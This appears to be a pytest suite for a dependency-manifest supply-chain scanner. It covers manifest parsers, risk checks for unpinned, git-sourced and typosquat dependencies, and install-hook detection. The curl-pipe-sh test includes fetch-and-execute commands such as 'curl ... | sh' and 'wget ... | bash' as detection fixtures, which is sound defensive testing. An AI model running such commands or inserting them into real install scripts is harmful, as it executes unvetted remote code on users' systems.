"""Unit tests for the deterministic dependency-manifest supply-chain scanner.

Covers the five manifest parsers, the five risk checks, and the activity
contract: no-model/no-network execution, determinism, empty-repo behaviour, and
the configurable typosquat list.
"""

from __future__ import annotations

import json
import socket
from pathlib import Path

import pytest

from quarry.config import QuarrySettings
from quarry.schemas import FindingStatus, Severity, VulnerabilityClass
from quarry_activities.dependency_risk import (
    Dependency,
    check_curl_pipe_sh,
    check_git_url_dep,
    check_npm_install_scripts,
    check_typosquat,
    check_unpinned_version,
    dependency_risk_scanner_activity,
    parse_cargo_toml,
    parse_go_mod,
    parse_package_json,
    parse_package_json_scripts,
    parse_pyproject_toml,
    parse_requirements_txt,
)
from quarry_activities.registry import activity_name, discover_activities


def _write(tmp_path: Path, name: str, content: str) -> Path:
    path = tmp_path / name
    path.write_text(content, encoding="utf-8")
    return path


def _by_name(deps: list[Dependency]) -> dict[str, Dependency]:
    return {dep.name: dep for dep in deps}


class TestParsers:
    def test_requirements_txt_unpinned_and_git(self, tmp_path: Path) -> None:
        path = _write(
            tmp_path,
            "requirements.txt",
            "requests>=2.0\nflask\nboto3==1.34.0\n"
            "git+https://github.com/user/repo.git\n# a comment\n",
        )
        deps = _by_name(parse_requirements_txt(path))
        assert deps["requests"].version_specifier == ">=2.0"
        assert deps["requests"].source_kind == "registry"
        assert deps["flask"].version_specifier is None
        assert deps["boto3"].version_specifier == "==1.34.0"
        assert deps["repo"].source_kind == "git"

    def test_pyproject_toml_project_and_poetry(self, tmp_path: Path) -> None:
        path = _write(
            tmp_path,
            "pyproject.toml",
            '[project]\ndependencies = ["requests>=2.0", "boto3==1.34.0"]\n\n'
            "[tool.poetry.dependencies]\n"
            'python = "^3.12"\nflask = "*"\n'
            'serde = { git = "https://github.com/user/serde.git" }\n',
        )
        deps = _by_name(parse_pyproject_toml(path))
        assert deps["requests"].version_specifier == ">=2.0"
        assert deps["flask"].version_specifier == "*"
        assert deps["serde"].source_kind == "git"
        assert "python" not in deps

    def test_package_json_sources_and_scripts(self, tmp_path: Path) -> None:
        path = _write(
            tmp_path,
            "package.json",
            json.dumps(
                {
                    "name": "demo",
                    "dependencies": {
                        "left-pad": "1.3.0",
                        "evil": "git+https://github.com/u/evil.git",
                    },
                    "devDependencies": {"jest": "*"},
                    "scripts": {"postinstall": "node setup.js", "build": "tsc --noEmit"},
                }
            ),
        )
        deps = _by_name(parse_package_json(path))
        assert deps["left-pad"].source_kind == "registry"
        assert deps["left-pad"].version_specifier == "1.3.0"
        assert deps["evil"].source_kind == "git"
        assert deps["evil"].version_specifier is None
        assert deps["jest"].version_specifier == "*"
        assert parse_package_json_scripts(path)["postinstall"] == "node setup.js"

    def test_package_json_scripts_absent(self, tmp_path: Path) -> None:
        path = _write(tmp_path, "package.json", json.dumps({"name": "demo"}))
        assert parse_package_json_scripts(path) == {}

    def test_cargo_toml_git_and_wildcard(self, tmp_path: Path) -> None:
        path = _write(
            tmp_path,
            "Cargo.toml",
            "[dependencies]\n"
            'serde = "1.0"\n'
            'foo = "*"\n'
            'bar = { git = "https://github.com/user/bar.git" }\n'
            'baz = { path = "../baz", version = "0.1.0" }\n',
        )
        deps = _by_name(parse_cargo_toml(path))
        assert deps["serde"].source_kind == "registry"
        assert deps["serde"].version_specifier == "1.0"
        assert deps["foo"].version_specifier == "*"
        assert deps["bar"].source_kind == "git"
        assert deps["bar"].version_specifier is None
        assert deps["baz"].source_kind == "registry"
        assert deps["baz"].version_specifier == "0.1.0"

    def test_go_mod_require_and_replace(self, tmp_path: Path) -> None:
        path = _write(
            tmp_path,
            "go.mod",
            "module example.com/app\n\ngo 1.22\n\n"
            "require (\n"
            "    example.com/pinned v1.2.3\n"
            "    example.com/unpinned\n"
            ")\n\n"
            "replace example.com/pinned => github.com/fork/pinned.git v1.4.0\n",
        )
        deps = _by_name(parse_go_mod(path))
        # The replace directive re-sources the module to git.
        assert deps["example.com/pinned"].source_kind == "git"
        assert deps["example.com/pinned"].version_specifier == "v1.4.0"
        assert deps["example.com/unpinned"].version_specifier is None


class TestChecks:
    @pytest.mark.parametrize("spec", [">=2.0", ">2.0", "*", "1.x", "latest", "", None])
    def test_unpinned_specifiers_flagged_high(self, spec: str | None) -> None:
        dep = Dependency(name="x", version_specifier=spec, file_path="requirements.txt", line=1)
        finding = check_unpinned_version(dep)
        assert finding is not None
        assert finding.severity is Severity.HIGH

    @pytest.mark.parametrize("spec", ["==1.2.3", "1.2.3", "^1.2", "~1.2", "<=2.0", "!=1.0"])
    def test_pinned_specifiers_not_flagged(self, spec: str) -> None:
        dep = Dependency(name="x", version_specifier=spec, file_path="requirements.txt", line=1)
        assert check_unpinned_version(dep) is None

    def test_git_and_url_sources_flagged_registry_not(self) -> None:
        git_dep = Dependency(name="a", source_kind="git", file_path="package.json", line=2)
        url_dep = Dependency(name="b", source_kind="url", file_path="package.json", line=3)
        registry_dep = Dependency(
            name="c", source_kind="registry", file_path="package.json", line=4
        )
        git_finding = check_git_url_dep(git_dep)
        url_finding = check_git_url_dep(url_dep)
        assert git_finding is not None and git_finding.severity is Severity.HIGH
        assert url_finding is not None and url_finding.severity is Severity.HIGH
        assert check_git_url_dep(registry_dep) is None

    def test_typosquat_matches_substring_and_empty_is_noop(self) -> None:
        dep = Dependency(name="python-dateutil", file_path="requirements.txt", line=1)
        finding = check_typosquat(dep, ["dateutil"])
        assert finding is not None
        assert finding.severity is Severity.MEDIUM
        assert finding.metadata["matched_pattern"] == "dateutil"
        assert check_typosquat(dep, []) is None

    def test_install_hooks_flagged_others_not(self) -> None:
        dep = Dependency(name="pkg", file_path="package.json", line=5)
        finding = check_npm_install_scripts(dep, {"postinstall": "node setup.js"})
        assert finding is not None
        assert finding.severity is Severity.MEDIUM
        benign = {"start": "node x", "test": "jest", "build": "tsc --noEmit"}
        assert check_npm_install_scripts(dep, benign) is None

    def test_curl_pipe_sh_critical_and_benign(self) -> None:
        dep = Dependency(name="postinstall", file_path="package.json", line=6)
        finding = check_curl_pipe_sh(
            dep, {"postinstall": "curl -s http://example.com/install.sh | sh"}
        )
        assert finding is not None
        assert finding.severity is Severity.CRITICAL
        # The shell family is covered, not just `| sh` (fix-forward F5).
        assert check_curl_pipe_sh(dep, {"x": "wget -qO- http://x/i.sh | bash"}) is not None
        assert check_curl_pipe_sh(dep, {"build": "tsc --noEmit"}) is None


class TestActivity:
    def test_acceptance_flags_unpinned_and_git(self, tmp_path: Path) -> None:
        _write(
            tmp_path,
            "requirements.txt",
            "requests>=2.0\ngit+https://github.com/user/repo.git\n",
        )
        findings = dependency_risk_scanner_activity(str(tmp_path), None)
        titles = {finding.title for finding in findings}
        assert "Unpinned dependency: requests" in titles
        assert any(title.startswith("Git dependency:") for title in titles)
        assert all(finding.vuln_class is VulnerabilityClass.SUPPLY_CHAIN for finding in findings)
        assert all(finding.status is FindingStatus.CANDIDATE for finding in findings)
        assert all(finding.created_by == "dependency-risk-scanner" for finding in findings)
        assert all(finding.evidence_path for finding in findings)

    def test_activity_is_registered(self) -> None:
        names = {activity_name(fn) for fn in discover_activities()}
        assert "dependency-risk-scanner" in names

    def test_empty_repo_returns_empty_list(self, tmp_path: Path) -> None:
        assert dependency_risk_scanner_activity(str(tmp_path), None) == []

    def test_determinism_identical_runs(self, tmp_path: Path) -> None:
        _write(tmp_path, "requirements.txt", "requests>=2.0\nflask\n")
        _write(
            tmp_path,
            "package.json",
            json.dumps({"name": "x", "scripts": {"postinstall": "node setup.js"}}),
        )
        first = dependency_risk_scanner_activity(str(tmp_path), None)
        second = dependency_risk_scanner_activity(str(tmp_path), None)
        assert [finding.model_dump() for finding in first] == [
            finding.model_dump() for finding in second
        ]

    def test_typosquat_configurable_and_noop_by_default(self, tmp_path: Path) -> None:
        _write(tmp_path, "requirements.txt", "python-dateutil==2.9.0\n")
        assert dependency_risk_scanner_activity(str(tmp_path), None) == []
        configured = dependency_risk_scanner_activity(
            str(tmp_path), json.dumps({"typosquat_patterns": ["dateutil"]})
        )
        assert any(
            finding.title == "Typosquat-risk dependency: python-dateutil" for finding in configured
        )

    def test_settings_default_typosquat_patterns_empty(self) -> None:
        assert QuarrySettings().typosquat_patterns == []

    def test_no_model_client_and_no_network(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        import quarry_models.factory as factory

        def _boom(*args: object, **kwargs: object) -> object:
            raise AssertionError("scanner must not construct a model client")

        def _no_net(*args: object, **kwargs: object) -> object:
            raise AssertionError("scanner must not use the network")

        monkeypatch.setattr(factory, "build_model_client", _boom)
        monkeypatch.setattr(socket, "socket", _no_net)
        monkeypatch.setattr(socket, "create_connection", _no_net)
        _write(tmp_path, "requirements.txt", "requests>=2.0\n")
        findings = dependency_risk_scanner_activity(str(tmp_path), None)
        assert len(findings) == 1
